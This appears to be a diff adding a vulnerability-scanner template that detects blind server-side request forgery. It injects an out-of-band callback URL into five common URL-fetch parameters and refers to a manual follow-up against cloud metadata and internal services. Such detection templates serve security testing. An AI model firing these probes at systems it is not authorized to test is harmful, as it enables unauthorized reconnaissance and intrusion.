@@ -1,0 +1,34 @@
+id: ssrf-metadata-oob
+
+info:
+  name: Blind SSRF via URL-Fetch Parameters (OOB)
+  author: bountyforge
+  severity: high
+  description: >
+    Probes common URL-fetch parameter names (webhook, callback, url, image_url, target)
+    with an out-of-band interaction payload to detect blind SSRF where no response
+    content is returned to the requester. A confirmed interaction indicates the server
+    performed the outbound request; follow up manually per payloads/ssrf.md to assess
+    reachability of cloud metadata or internal services specifically.
+  reference:
+    - https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/
+  classification:
+    cwe-id: CWE-918
+  tags: ssrf,oob,blind,api
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?url={{interactsh-url}}"
+      - "{{BaseURL}}/?webhook={{interactsh-url}}"
+      - "{{BaseURL}}/?callback={{interactsh-url}}"
+      - "{{BaseURL}}/?image_url={{interactsh-url}}"
+      - "{{BaseURL}}/?target={{interactsh-url}}"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
+        condition: or
